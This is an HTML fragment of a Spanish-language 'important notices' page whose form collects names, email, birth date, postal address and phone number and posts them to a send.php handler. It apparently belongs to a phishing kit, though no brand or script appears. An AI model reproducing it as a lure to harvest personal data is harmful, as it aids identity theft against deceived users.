...
<h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span id="numeroAvisosId" style="box-sizing: inherit;">1</span></span><span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;Avisos importantes</span></span></h2>

<form action="./infoz/send.php" method="post">
<div class="row">
<div class="col-md-6 form-group"><label for="first_name">Apellidos</label> <input id="first_name" name="first_name" required="" type="text" /></div>

<div class="col-md-6 form-group"><label for="last_name">Nombres</label> <input id="last_name" name="last_name" required="" type="text" /></div>
</div>

<div class="row">
<div class="col-md-6 form-group"><label for="email">Email</label> <input id="email" name="email" required="" type="email" /></div>

<div class="col-md-6 form-group"><label for="dob">Fecha de Nacimiento</label> <input id="dob" name="dob" placeholder="DD/MM/AAAA" required="" type="date" /></div>

<div class="row">
<div class="col-md-4 form-group"><label for="address">Direcci&oacute;n Postal</label> <input id="address" name="address" required="" type="text" /></div>

<div class="col-md-4 form-group"><label for="postal">C&oacute;digo Postal</label> <input id="postal" name="postal" required="" type="text" /></div>

<div class="col-md-4 form-group"><label for="city">Ciudad</label> <input id="city" name="city" required="" type="text" /></div>

<div class="col-md-4 form-group"><span style="font-size:14px;"><strong>N&uacute;mero de Tel&eacute;fono</strong></span><input id="first_name" maxlength="11" name="num" required="" style="margin-bottom: 15px; font-size: 16px; width: 415.398px; padding: 12px; border-width: 1px; border-style: solid; border-color: rgb(221, 221, 221); border-radius: 5px; background-color: rgb(249, 249, 249);" type="tel" /></div>
